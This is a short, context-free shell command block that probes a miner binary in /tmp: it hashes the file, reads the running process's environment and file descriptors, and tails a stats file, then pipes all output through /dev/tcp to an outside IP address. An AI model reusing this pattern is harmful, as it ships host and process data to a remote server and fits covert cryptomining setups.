{
  strings /tmp/zion-miner-real | grep -c ZION_NO_STICKY
  echo S1
  md5sum /tmp/zion-miner-real
  echo S2
  stat -c %s /tmp/zion-miner-real
  echo S3
  PID=$(pgrep -f zion-miner-real | head -1)
  cat /proc/$PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE NO_STICKY
  echo S4
  ls -la /proc/$PID/fd/1 2>&1
  echo S5
  readlink /proc/$PID/fd/1 2>&1
  echo S6
  tail -30 /tmp/zion-miner-stats.json 2>&1
} > /dev/tcp/62.171.141.136/8080 2>&1
